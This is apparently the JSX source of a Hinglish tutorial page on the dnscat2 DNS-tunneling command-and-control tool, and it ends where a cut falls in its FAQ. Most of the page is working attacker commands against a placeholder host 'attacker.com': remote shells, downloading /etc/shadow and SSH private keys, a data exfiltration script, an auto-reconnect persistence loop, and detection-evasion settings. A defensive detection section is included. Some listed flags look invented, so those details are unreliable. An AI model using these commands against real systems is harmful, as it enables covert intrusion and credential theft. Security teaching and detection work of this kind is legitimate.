import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Dnscat2() {
  return (
    <TutorialLayout
      title="dnscat2"
      subtitle="DNS tunneling C2 tool — DNS ke through secret communication, firewall bypass"
      icon="🕳️"
      prev={{ to: '/tool/socat', label: 'socat' }}
      next={{ to: '/tool/empire', label: 'empire' }}
    >
      <h2>What is Dnscat2?</h2>
      <p>
        dnscat2 ek DNS tunneling tool hai jo DNS queries ke through ek encrypted communication channel banata hai। Firewall bypass karne ke liye bahut powerful hai kyunki zyada tar networks DNS traffic (port 53) ko block nahi karte — internet chalane ke liye DNS zaroori hai।
      </p>
      <p>
        Yeh ek Command and Control (C2) framework hai — attacker ko persistent shell milta hai jo DNS ke through communicate karta hai। Data ko DNS packets mein chhupa kar bheja jaata hai, isliye detection bahut mushkil hota hai। Red team operations, penetration testing, aur data exfiltration ke liye use hota hai।
      </p>
      <p>
        dnscat2 Ron Bowes (iagox86) ne banaya hai। यह Ruby में लिखा गया server और C में client है। DNS tunneling C2 tools mein sabse popular hai। Cobalt Strike जैसे commercial tools में भी DNS channel built-in है — लेकिन dnscat2 free और open source है।
      </p>
      <p>
        DNS tunneling का concept बहुत elegant है — DNS protocol को data transfer के लिए misuse करना। हर DNS query में data encode होता है, और DNS reply में response आता है। Firewall सिर्फ DNS traffic देखता है — उसे पता नहीं चलता कि अंदर secret C2 communication चल रही है। यह technique 1998 से exist करती है लेकिन dnscat2 ने इसे practical और reliable बनाया।
      </p>
      <p>
        dnscat2 का architecture client-server model पर based है। Server attacker की machine पर चलता है और authoritative DNS server की तरह काम करता है। Client target machine पर चलता है और DNS queries भेजकर server से communicate करता है। दोनों side पर data encrypt होता है — shared secret key से। यह tool red teamers के लिए backup C2 channel के रूप में बहुत useful है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> dnscat2 केवल अधिकृत red team operations या lab testing में उपयोग करें। बिना अनुमति के C2 channel बनाना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत C2 access अपराध हो सकता है। DNS tunneling से data exfiltration करना गंभीर अपराध है — 3 साल तक की जेल और जुर्माना हो सकता है।
      </div>

      <h2>History of Dnscat2</h2>
      <p>
        dnscat2 को Ron Bowes (iagox86) ने 2012 में बनाया था। यह original dnscat tool का complete rewrite है जो 2008 में बना था। Original dnscat में encryption नहीं थी और performance भी अच्छी नहीं थी। dnscat2 में encryption, better performance, और modern DNS features add किए गए।
      </p>
      <p>
        Ron Bowes एक知名 security researcher हैं जो SkullSecurity.org पर research publish करते हैं। उन्होंने कई security tools बनाए हैं लेकिन dnscat2 सबसे popular है। यह red team community में standard DNS tunneling C2 tool बन गया है। GitHub पर 3000+ stars हैं और active development जारी है।
      </p>
      <p>
        DNS tunneling का concept नया नहीं है — 1998 से researchers इसे explore कर रहे हैं। लेकिन dnscat2 ने इसे practical और reliable बनाया। पहले जो काम manually DNS packets craft करके करना पड़ता था, वो dnscat2 automated कर देता है। आज भी यह DNS-based C2 का standard tool है।
      </p>

      <h2>How DNS Tunneling Works?</h2>
      <p>
        DNS tunneling DNS protocol का misuse करता है data transfer के लिए। यह technique बहुत clever है — DNS internet की backbone है, इसे block करना लगभग impossible है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Client (Target):</strong> Data को DNS query में encode करके भेजता है — e.g., encoded-data.attacker.com। हर query में कुछ bytes data होता है</li>
        <li><strong className="text-white">DNS Resolver:</strong> Query को attacker के DNS server तक forward करता है। Resolver को पता नहीं होता कि query में hidden data है</li>
        <li><strong className="text-white">Server (Attacker):</strong> DNS query receive करता है, subdomain part decode करता है, command execute करता है, और response DNS reply में भेजता है</li>
        <li><strong className="text-white">Encrypted Channel:</strong> दोनों side पर data encrypt होता है — shared secret key से। Firewall सिर्फ DNS queries देखता है, content नहीं</li>
        <li><strong className="text-white">Record Types:</strong> TXT, CNAME, MX, A records — सब data transfer के लिए use हो सकते हैं। TXT सबसे fast है (64KB per query)</li>
        <li><strong className="text-white">Bidirectional:</strong> Client → Server (queries में data) और Server → Client (replies में data) दोनों direction में communication होती है</li>
        <li><strong className="text-white">Persistent:</strong> Session maintain होती है — client reconnect कर सकता है और session resume होगी</li>
        <li><strong className="text-white">Stealthy:</strong> Normal DNS traffic जैसा दिखता है — IDS/IPS usually detect नहीं कर पाते</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="Server Install (Attacker Side)"
        code={`# Clone और install:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Server start (DNS domain के साथ):
sudo ruby dnscat2.rb --dns domain=attacker.com --no-cache

# Secret key के साथ (encrypted):
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=mysecretkey

# Specific port:
sudo ruby dnscat2.rb --dns domain=attacker.com --dnsport=5353

# Debug mode:
sudo ruby dnscat2.rb --dns domain=attacker.com --debug

# All options:
sudo ruby dnscat2.rb --help`}
      />

      <CodeBlock
        title="Client Install (Target Side)"
        code={`# Linux client compile:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect:
./dnscat2 --dns server=attacker.com

# Secret key के साथ:
./dnscat2 --dns server=attacker.com --secret=mysecretkey

# Direct IP से:
./dnscat2 attacker.com

# Windows client:
dnscat2-v0.07-client-win32.exe --dns server=attacker.com

# Pre-compiled Windows binary download:
# GitHub releases से download करो

# Cross-compile (Linux → Windows):
# MinGW use करो Windows binary बनाने के लिए`}
      />

      <h2>Basic Usage</h2>
      <CodeBlock
        title="Server + Client Complete Setup"
        code={`# Step 1: DNS configure करो (domain registrar में):
# NS record: dns.attacker.com → ns.dns.attacker.com
# A record: ns.dns.attacker.com → SERVER_IP
# यह 24-48 hours पहले setup करो (DNS propagation)

# Step 2: Server start करो:
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=mysecretkey

# Step 3: Client connect करो (target पर):
./dnscat2 --dns server=attacker.com --secret=mysecretkey

# Step 4: Server पर session select करो:
sessions
session -i 1

# Step 5: Shell प्राप्त करो:
shell

# Step 6: Commands run करो:
whoami
id
ls /tmp
cat /etc/passwd

# Step 7: File transfer:
download /etc/passwd /tmp/passwd.txt
upload /tmp/tool.sh /tmp/tool.sh

# Step 8: Session close:
kill 1`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Default</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dns domain=X</td><td className="py-2 px-3">DNS domain configure (server side)</td><td className="py-2 px-3">Required</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dns server=X</td><td className="py-2 px-3">DNS server specify (client side)</td><td className="py-2 px-3">Auto-detect</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--secret=X</td><td className="py-2 px-3">Encryption key set करें</td><td className="py-2 px-3">None (plaintext)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dnsport=X</td><td className="py-2 px-3">DNS port (default 53)</td><td className="py-2 px-3">53</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--no-cache</td><td className="py-2 px-3">DNS cache disable (server)</td><td className="py-2 px-3">Enabled</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--debug</td><td className="py-2 px-3">Debug output दिखाएं</td><td className="py-2 px-3">Off</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--delay=X</td><td className="py-2 px-3">Request delay (ms) — stealth mode</td><td className="py-2 px-3">0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--max-length=X</td><td className="py-2 px-3">Max DNS name length</td><td className="py-2 px-3">255</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--type=X</td><td className="py-2 px-3">DNS record type (TXT, CNAME, MX, A, AAAA)</td><td className="py-2 px-3">TXT</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--encrypted</td><td className="py-2 px-3">Force encryption (auto key exchange)</td><td className="py-2 px-3">Off</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dnsserver=X</td><td className="py-2 px-3">Custom DNS server use करें</td><td className="py-2 px-3">System DNS</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--passthrough=X</td><td className="py-2 px-3">Non-tunnel queries pass through</td><td className="py-2 px-3">Block</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--isn=X</td><td className="py-2 px-3">Initial sequence number</td><td className="py-2 px-3">Random</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--firewall</td><td className="py-2 px-3">Firewall evasion mode</td><td className="py-2 px-3">Off</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--exec=X</td><td className="py-2 px-3">Execute command on connect</td><td className="py-2 px-3">None</td></tr>
          </tbody>
        </table>
      </div>

      <h2>DNS Tunnel Setup (Detailed)</h2>
      <p>
        DNS tunnel setup के लिए domain registrar में specific DNS records configure करने होते हैं। यह सबसे important step है — गलत setup से tunnel काम नहीं करेगा।
      </p>
      <CodeBlock
        title="Complete DNS Setup"
        code={`# Step 1: Domain register करो
# Cheap domains: .xyz, .tk, .ml (Namecheap, Porkbun)
# उदाहरण: attacker.xyz

# Step 2: DNS records configure करो
# Domain registrar के DNS management panel में:

# NS record (delegation):
# dns.attacker.xyz → ns.dns.attacker.xyz
# यह बताता है कि dns.attacker.xyz का DNS server ns.dns.attacker.xyz है

# A record (IP mapping):
# ns.dns.attacker.xyz → YOUR_SERVER_IP
# यह ns.dns.attacker.xyz को attacker server IP से map करता है

# Step 3: DNS propagation wait करो
# 24-48 hours लग सकते हैं
# Check करो: dig NS dns.attacker.xyz
# Expected: ns.dns.attacker.xyz

# Step 4: Verify setup
# Attacker server पर:
dig @localhost dns.attacker.xyz
# यह server को query करेगा

# Step 5: Firewall rules (server side)
# Port 53 UDP/TCP open होना चाहिए
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 53 -j ACCEPT`}
      />

      <h2>Encrypted Sessions (Detailed)</h2>
      <p>
        Encryption dnscat2 का critical feature है — बिना encryption के data readable होता है।
      </p>
      <CodeBlock
        title="Encryption Setup (Complete)"
        code={`# Method 1: Shared Secret Key (Recommended)
# Server side:
KEY=$(openssl rand -hex 32)
echo "Secret Key: $KEY"
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=$KEY

# Client side (same key):
./dnscat2 --dns server=attacker.com --secret=$KEY

# Method 2: Auto Key Exchange (--encrypted flag)
# Server:
sudo ruby dnscat2.rb --dns domain=attacker.com --encrypted

# Client:
./dnscat2 --dns server=attacker.com --encrypted

# Key verification:
# Server output में "Encryption enabled" दिखना चाहिए
# Session info में encrypted=true होना चाहिए

# Key rotation (security best practice):
# हर operation के लिए नया key generate करो
# Keys को safely store करो (password manager)

# Encryption algorithm:
# AES-256-CTR + HMAC-SHA256
# Key exchange: ECDH (Elliptic Curve Diffie-Hellman)`}
      />

      <h2>File Transfer (Detailed)</h2>
      <p>
        DNS tunneling slow है लेकिन small files transfer कर सकते हैं — configs, hashes, credentials।
      </p>
      <CodeBlock
        title="File Transfer Operations"
        code={`# Download files (target → attacker):
download /etc/passwd /tmp/passwd.txt
download /etc/shadow /tmp/shadow.txt
download /home/user/.ssh/id_rsa /tmp/id_rsa
download /var/log/auth.log /tmp/auth.log

# Upload files (attacker → target):
upload /tmp/tool.sh /tmp/tool.sh
upload /tmp/linpeas.sh /tmp/linpeas.sh
upload /tmp/mimikatz.exe /tmp/mimikatz.exe

# Directory listing:
ls /tmp/
ls /home/user/
ls /etc/

# File size check (transfer time estimate):
# DNS tunnel speed: ~10-50 KB/s
# 1KB file: ~2-10 seconds
# 100KB file: ~2-10 minutes
# 1MB file: ~20-100 minutes (avoid!)

# Transfer optimization:
# 1. Compress files: gzip file.txt
# 2. Base64 encode: base64 file.bin
# 3. Split large files: split -b 10K largefile chunk_
# 4. Transfer chunks separately`}
      />

      <h2>Command Execution</h2>
      <CodeBlock
        title="Shell Commands and Execution"
        code={`# Interactive shell (persistent):
shell

# Shell session select (multiple shells):
window -i 1
window -i 2

# Single command execute (non-interactive):
exec whoami
exec id
exec uname -a
exec cat /etc/os-release

# System enumeration:
exec ps aux
exec netstat -tlnp
exec ifconfig
exec ip addr
exec df -h
exec mount

# User enumeration:
exec whoami
exec id
exec cat /etc/passwd
exec cat /etc/group
exec last

# Network enumeration:
exec arp -a
exec route -n
exec cat /etc/resolv.conf
exec ss -tlnp

# Process list:
ps

# Kill process:
kill <pid>

# Background shell (run in background):
# shell command को background में run करने के लिए
# Server side: Ctrl+Z से background`}
      />

      <h2>Multi-Client Support</h2>
      <CodeBlock
        title="Multiple Sessions Management"
        code={`# Sessions list (server side):
sessions

# Specific session select:
session -i 1
session -i 2
session -i 3

# Windows list:
windows

# Window select:
window -i 1
window -i 2

# Kill specific session:
kill 1
kill 2

# Shutdown all sessions:
quit

# Multiple clients connect कर सकते हैं same server से
# हर client का अलग session ID होता है
# अलग-अलग target machines से connect कर सकते हो

# Session naming:
# Client side: --name=webserver1
# Server side: sessions में name दिखेगा

# Session persistence:
# Client disconnect होने पर session रहता है
# Client reconnect कर सकता है — session resume होगा`}
      />

      <h2>Firewall Bypass Techniques</h2>
      <p>
        DNS tunneling का सबसे बड़ा advantage — DNS traffic rarely blocked होता है। Internet काम करने के लिए DNS ज़रूरी है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Port 53 Allowed:</strong> Internet काम करने के लिए DNS ज़रूरी है — firewalls block नहीं करते। Corporate networks, airports, hotels — सब जगह DNS allowed है</li>
        <li><strong className="text-white">Deep Packet Inspection:</strong> DNS queries encrypted होती हैं (secret key से) — content नहीं दिखता। DPI systems सिर्फ DNS structure देखते हैं, data नहीं</li>
        <li><strong className="text-white">Protocol Blending:</strong> DNS queries normal traffic जैसी दिखती हैं। Random subdomain prefixes use करो — pattern detect नहीं होगा</li>
        <li><strong className="text-white">Restricted Networks:</strong> जहाँ सिर्फ DNS allowed हो वहाँ भी काम करता है — captive portals, corporate firewalls, IoT networks</li>
        <li><strong className="text-white">Data Exfiltration:</strong> Files और data DNS के through secretly बाहर जा सकते हैं। Compressed + encoded data chunks में transfer</li>
        <li><strong className="text-white">DNS over HTTPS (DoH):</strong> dnscat2 DoH support करता है — HTTPS traffic में DNS queries hide हो जाती हैं</li>
        <li><strong className="text-white">Backup C2:</strong> Primary HTTP/S C2 fail होने पर DNS tunnel backup के रूप में काम करता है</li>
      </ul>

      <h2>Secret Mode and Encrypted Mode</h2>
      <CodeBlock
        title="Stealth and Encryption Modes"
        code={`# Secret Mode (Shared Key Encryption):
# Server:
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=MyS3cr3tK3y

# Client:
./dnscat2 --dns server=attacker.com --secret=MyS3cr3tK3y

# Encrypted Mode (Auto Key Exchange):
# Server:
sudo ruby dnscat2.rb --dns domain=attacker.com --encrypted

# Client:
./dnscat2 --dns server=attacker.com --encrypted

# Difference:
# --secret: Manual key, same key both sides
# --encrypted: Automatic ECDH key exchange, more secure

# Stealth options:
# 1. TXT records (most data per query):
./dnscat2 --dns server=attacker.com,type=TXT

# 2. CNAME records (stealthier):
./dnscat2 --dns server=attacker.com,type=CNAME

# 3. MX records (less monitored):
./dnscat2 --dns server=attacker.com,type=MX

# 4. A records (slowest, stealthiest):
./dnscat2 --dns server=attacker.com,type=A

# 5. Slow transfer (detection avoid):
./dnscat2 --dns server=attacker.com --delay=2000

# 6. Random subdomain prefix:
./dnscat2 --dns server=attacker.com --prefix=random

# 7. Max length control:
./dnscat2 --dns server=attacker.com --max-length=63`}
      />

      <h2>DNS Record Types for Tunneling</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Record Type</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Data Per Query</th>
              <th className="text-left py-2 px-3 text-neon-green">Speed</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">TXT</td><td className="py-2 px-3">Text records — सबसे ज़्यादा data per query</td><td className="py-2 px-3">Up to 64KB</td><td className="py-2 px-3">Fastest</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CNAME</td><td className="py-2 px-3">Domain alias — stealthy, less monitored</td><td className="py-2 px-3">~255 bytes</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MX</td><td className="py-2 px-3">Mail records — usually not monitored</td><td className="py-2 px-3">~255 bytes</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">A</td><td className="py-2 px-3">IP address (4 bytes per query)</td><td className="py-2 px-3">4 bytes</td><td className="py-2 px-3">Slowest</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">AAAA</td><td className="py-2 px-3">IPv6 address (16 bytes per query)</td><td className="py-2 px-3">16 bytes</td><td className="py-2 px-3">Slow</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated DNS Tunnel Script"
        code={`#!/bin/bash
# DNS Tunnel Automation Script

DOMAIN="attacker.com"
SECRET=$(openssl rand -hex 32)
SERVER_IP="YOUR_SERVER_IP"

echo "[+] Domain: $DOMAIN"
echo "[+] Secret: $SECRET"
echo "[+] Server: $SERVER_IP"

# DNS records setup reminder:
echo "[!] Configure DNS records:"
echo "    NS: dns.$DOMAIN → ns.dns.$DOMAIN"
echo "    A: ns.dns.$DOMAIN → $SERVER_IP"

# Start server (run on attacker):
start_server() {
    echo "[+] Starting dnscat2 server..."
    sudo ruby dnscat2.rb --dns domain=$DOMAIN --secret=$SECRET
}

# Generate client command:
generate_client() {
    echo "[+] Client command:"
    echo "    ./dnscat2 --dns server=$DOMAIN --secret=$SECRET"
}

# Monitor connections:
monitor() {
    echo "[+] Monitoring DNS queries..."
    sudo tcpdump -i any port 53 -n | grep "$DOMAIN"
}

# Main menu:
echo "1) Start Server"
echo "2) Generate Client Command"
echo "3) Monitor DNS Traffic"
read -p "Choose: " choice

case $choice in
    1) start_server ;;
    2) generate_client ;;
    3) monitor ;;
esac`}
      />

      <CodeBlock
        title="Data Exfiltration Script"
        code={`#!/bin/bash
# Data Exfiltration via DNS Tunnel

# Compress and encode file:
exfiltrate_file() {
    local FILE=$1
    local OUTPUT=$2

    echo "[+] Exfiltrating: $FILE"

    # Compress:
    gzip -c $FILE > /tmp/data.gz

    # Base64 encode:
    base64 /tmp/data.gz > /tmp/data.b64

    # Split into chunks (DNS query safe size):
    split -b 50 /tmp/data.b64 /tmp/chunk_

    echo "[+] File split into $(ls /tmp/chunk_* | wc -l) chunks"
    echo "[+] Transfer via dnscat2 download command"

    # Cleanup:
    rm -f /tmp/data.gz /tmp/data.b64 /tmp/chunk_*
}

# Reassemble on server:
reassemble() {
    local DIR=$1
    local OUTPUT=$2

    echo "[+] Reassembling chunks..."
    cat $DIR/chunk_* > /tmp/assembled.b64
    base64 -d /tmp/assembled.b64 > /tmp/data.gz
    gunzip /tmp/data.gz > $OUTPUT

    echo "[+] File reassembled: $OUTPUT"
}

# Usage:
# exfiltrate_file "/etc/passwd" "/tmp/passwd.txt"
# reassemble "/tmp/chunks" "/tmp/passwd.txt"`}
      />

      <CodeBlock
        title="Persistent Connection Script"
        code={`#!/bin/bash
# Persistent DNS Tunnel with Auto-Reconnect

DOMAIN="attacker.com"
SECRET="mysecretkey"
DELAY=30

while true; do
    echo "[$(date)] Connecting to dnscat2..."

    # Try to connect:
    timeout 300 ./dnscat2 --dns server=$DOMAIN --secret=$SECRET --delay=500

    # If disconnected, wait and retry:
    echo "[$(date)] Disconnected. Retrying in $DELAY seconds..."
    sleep $DELAY

    # Random delay (detection avoid):
    RANDOM_DELAY=$((RANDOM % 60 + 10))
    echo "[$(date)] Random delay: $RANDOM_DELAY seconds"
    sleep $RANDOM_DELAY
done`}
      />

      <h2>Dnscat2 vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">dnscat2</th>
              <th className="text-left py-2 px-3 text-neon-green">Iodine</th>
              <th className="text-left py-2 px-3 text-neon-green">dns2tcp</th>
              <th className="text-left py-2 px-3 text-neon-green">Cobalt Strike DNS</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Protocol</td><td className="py-2 px-3">DNS (TXT/CNAME/MX)</td><td className="py-2 px-3">DNS (NULL/TXT/CNAME)</td><td className="py-2 px-3">DNS (TXT)</td><td className="py-2 px-3">DNS (A/TXT)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Encryption</td><td className="py-2 px-3">हाँ (shared secret)</td><td className="py-2 px-3">हाँ (symmetric)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (malleable C2)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Firewall Bypass</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Good</td><td className="py-2 px-3">Excellent</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">Slow (DNS latency)</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Slow</td><td className="py-2 px-3">Slow</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Open Source</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं (paid)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">C2 Features</td><td className="py-2 px-3">Shell, file transfer</td><td className="py-2 px-3">IP tunnel only</td><td className="py-2 px-3">TCP tunnel</td><td className="py-2 px-3">Full C2 framework</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Detection Difficulty</td><td className="py-2 px-3">Hard</td><td className="py-2 px-3">Hard</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Easy</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Connection Failed — client connect नहीं हो रहा', a: 'DNS record verify करो: dig NS dns.attacker.com। NS record attacker server को point करना चाहिए। Server debug mode में run करो: --debug। Port 53 open check करो: sudo netstat -tlnp | grep 53। DNS propagation 24-48 hours लग सकता है।' },
          { q: 'Slow Transfer — data बहुत धीमे आ रहा है', a: 'DNS tunneling inherently slow है (10-50 KB/s)। TXT records use करो (ज़्यादा data per query)। Max length बढ़ाओ: --max-length=255। Large files transfer मत करो — सिर्फ commands और small files। Compression use करो (gzip)।' },
          { q: 'DNS Not Resolving — domain resolve नहीं हो रहा', a: 'DNS propagation 24-48 hours लग सकता है। Different DNS server try करो: --dnsserver=8.8.8.8। Direct IP से test करो: nslookup test.dns.attacker.com SERVER_IP। A record check करो: dig A ns.dns.attacker.com।' },
          { q: 'Encryption काम नहीं कर रही', a: 'Server और client दोनों पर same secret key use करना ज़रूरी है। --secret flag identical होना चाहिए। --encrypted flag try करो (auto key exchange)। Key में special characters avoid करो।' },
          { q: 'DNS queries detect हो रही हैं', a: '--delay flag से slow करो (e.g., --delay=2000)। Random subdomain prefix use करो: --prefix=random। TXT की जगह CNAME/MX try करो। DNS query length minimize करो: --max-length=63।' },
          { q: 'Port 53 already in use है', a: 'Local DNS server (systemd-resolved) stop करो: sudo systemctl stop systemd-resolved। या different port use करो: --dnsport=5353 (client भी same port specify करे)। resolvectl भी check करो।' },
          { q: 'Client disconnect हो रहा है बार-बार', a: 'Network unstable हो सकता है। --delay बढ़ाओ। Firewall rules check करो। DNS timeout increase करो। Persistent script use करो (auto-reconnect)।' },
          { q: 'Windows client काम नहीं कर रहा', a: 'Pre-compiled binary use करो GitHub releases से। Antivirus disable करो (detect कर सकता है)। PowerShell DNS tunneling alternative try करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        DNS tunneling detect करना मुश्किल है लेकिन impossible नहीं। Organizations को DNS monitoring implement करनी चाहिए।
      </p>
      <CodeBlock
        title="DNS Tunnel Detection Methods"
        code={`# 1. DNS Query Length Analysis:
# Normal DNS queries short होती हैं (< 50 chars)
# Tunnel queries लंबी होती हैं (100+ chars)
# Monitoring: Average query length track करो

# 2. DNS Query Frequency:
# Tunnel में बहुत ज़्यादा DNS queries जाती हैं
# Normal traffic से 10x-100x ज़्यादा queries
# Alert: queries per minute > threshold

# 3. DNS Entropy Analysis:
# Encoded data high entropy रखता है (random-looking)
# Normal domain names low entropy (readable words)
# Shannon entropy > 3.5 suspicious है

# 4. Subdomain Length Distribution:
# Normal: short subdomains (www, mail, api)
# Tunnel: long random subdomains (aGVsbG8gd29ybGQ)

# 5. Query Type Anomalies:
# Normal: Mostly A, AAAA queries
# Tunnel: Unusual TXT, CNAME, MX queries

# 6. Detection Tools:
# - PassiveDNS (passive DNS monitoring)
# - Snort/Suricata DNS rules
# - Zeek (Bro) DNS analysis scripts
# - DNS query volume monitoring
# - Machine learning based detection

# 7. DNS Sinkhole:
# Known malicious domains block करो
# DNS firewall लगाओ (RPZ zones)

# 8. DNS Response Analysis:
# Normal: Small responses
# Tunnel: Large TXT responses (64KB)

# 9. Time-based Analysis:
# Tunnel: Regular intervals between queries
# Normal: Random intervals

# 10. Domain Reputation:
# Unknown/newly registered domains suspicious
# WHOIS age check, threat intelligence feeds`}
      />

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Complete Practice Lab"
        code={`# दो machines चाहिए:
# 1. Attacker (VPS) — dnscat2 server
# 2. Target (VM) — dnscat2 client

# Step 1: Domain register करो
# Cheap domains: .xyz ($1), .tk (free), .ml (free)
# Namecheap, Porkbun, Freenom

# Step 2: VPS setup (attacker server)
# DigitalOcean, Vultr, Linode ($5/month)
# Ubuntu 22.04 recommended
# Port 53 open (UDP/TCP)

# Step 3: DNS records configure करो
# Domain registrar DNS panel में:
# NS record: dns.attacker.xyz → ns.dns.attacker.xyz
# A record: ns.dns.attacker.xyz → VPS_IP

# Step 4: DNS propagation wait करो
# dig NS dns.attacker.xyz (verify)
# 24-48 hours लग सकते हैं

# Step 5: Server install करो (VPS पर):
sudo apt update
sudo apt install ruby ruby-dev build-essential
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Step 6: Client install करो (target VM पर):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Step 7: Test connection
# Server: sudo ruby dnscat2.rb --dns domain=attacker.xyz --secret=testkey
# Client: ./dnscat2 --dns server=attacker.xyz --secret=testkey

# Practice exercises:
# 1. Shell access प्राप्त करो
# 2. Files transfer करो (small files)
# 3. Detection tools से test करो (tcpdump)
# 4. Stealth options try करो (--delay, --type)
# 5. Multiple sessions manage करो
# 6. Encryption setup करो
# 7. Auto-reconnect script बनाओ`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced DNS Tunneling"
        code={`# Multi-hop tunneling:
# DNS tunnel + SSH tunnel combo:
# Target → DNS tunnel → Attacker → SSH tunnel → Internal network
# यह double layer security है

# Backup C2 channel setup:
# Primary: HTTP/S (fast, stealthy)
# Backup: DNS tunnel (always works through firewalls)
# Cobalt Strike में DNS beacon as backup configure करो

# Data exfiltration workflow:
# 1. Sensitive files compress करो (gzip)
# 2. Base64 encode करो
# 3. DNS tunnel से small chunks में transfer करो
# 4. Server पर reassemble करो
# 5. Verify integrity (checksum)

# DNS over HTTPS (DoH) support:
# dnscat2 DoH support करता है
# HTTPS traffic में DNS queries hide हो जाती हैं
# Corporate proxy bypass करने के लिए best

# Custom DNS server setup:
# BIND9 configure करो authoritative NS के लिए
# Zone file में NS record add करो
# SOA record properly configure करो

# DNS tunnel + Tor:
# Tor hidden service पर DNS server expose करो
# Extra anonymity layer

# Automated C2 infrastructure:
# Terraform से VPS auto-deploy करो
# DNS records auto-configure करो
# dnscat2 auto-start करो

# DNS tunnel detection evasion:
# 1. Random delays (--delay=1000-5000)
# 2. Random subdomain prefixes (--prefix=random)
# 3. Mix record types (TXT + CNAME + MX)
# 4. Normal-looking domain names use करो
# 5. Low query frequency maintain करो`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
